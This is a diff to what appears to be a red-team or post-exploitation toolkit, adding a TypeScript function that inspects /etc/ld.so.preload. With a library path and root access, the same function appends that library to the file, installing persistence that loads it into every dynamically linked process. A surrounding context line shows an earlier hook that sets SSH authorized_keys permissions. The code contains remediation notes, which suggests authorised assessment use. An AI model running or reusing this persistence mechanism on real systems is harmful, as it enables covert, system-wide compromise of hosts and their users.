@@ -302,3 +302,72 @@ chmod 600 "$target_dir/.ssh/authorized_keys" 2>/dev/null
 
   return { output: output.join("\n"), findings }
 }
+
+export async function ldSoPreload(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== ld.so.preload Persistence ==="]
+  const libPath = argVal(args, "--library-path")
+
+  const script = `
+echo "--- /etc/ld.so.preload Status ---"
+if [ -f /etc/ld.so.preload ]; then
+  echo "[!] /etc/ld.so.preload EXISTS:"
+  cat /etc/ld.so.preload
+  echo ""
+  echo "Permissions:"
+  ls -la /etc/ld.so.preload
+else
+  echo "[-] /etc/ld.so.preload does not exist"
+  writable=$([ -w /etc/ ] && echo "WRITABLE" || echo "read-only")
+  echo "/etc/ is $writable"
+fi
+echo ""
+echo "--- Current ld.so.conf.d entries ---"
+ls -la /etc/ld.so.conf.d/ 2>/dev/null
+echo ""
+echo "--- Shared library cache ---"
+ldconfig -p 2>/dev/null | wc -l
+echo ""
+${libPath ? `
+echo "--- Installing ld.so.preload Persistence ---"
+if [ "$(id -u)" = "0" ]; then
+  echo "${libPath}" >> /etc/ld.so.preload && echo "[+] Library added to /etc/ld.so.preload: ${libPath}" || echo "[-] Failed to write /etc/ld.so.preload"
+else
+  echo "[-] Root required for /etc/ld.so.preload modification"
+fi
+` : `echo "[*] Dry run — pass --library-path /path/to/lib.so to install. REQUIRES ROOT."
+echo "[*] WARNING: Every dynamically linked process will load this library"
+`}
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  if (r.stdout.includes("[+] Library added")) {
+    findings.push({
+      checkId: "LNX-LDSOPRELOAD-001",
+      provider: "linuxhook",
+      severity: "CRITICAL",
+      status: "INSTALLED",
+      resource: "/etc/ld.so.preload",
+      title: "ld.so.preload persistence installed",
+      details: `Library ${libPath} added to /etc/ld.so.preload — loaded into every dynamically linked process on the system`,
+      remediation: "Remove entry from /etc/ld.so.preload. Delete the malicious shared library. Run ldconfig.",
+    })
+  }
+
+  if (r.stdout.includes("ld.so.preload EXISTS")) {
+    findings.push({
+      checkId: "LNX-LDSOPRELOAD-002",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "IDENTIFIED",
+      resource: "/etc/ld.so.preload",
+      title: "ld.so.preload file already exists",
+      details: "An existing /etc/ld.so.preload was found — may indicate existing compromise or legitimate use",
+      remediation: "Audit /etc/ld.so.preload contents. Verify all listed libraries are legitimate.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
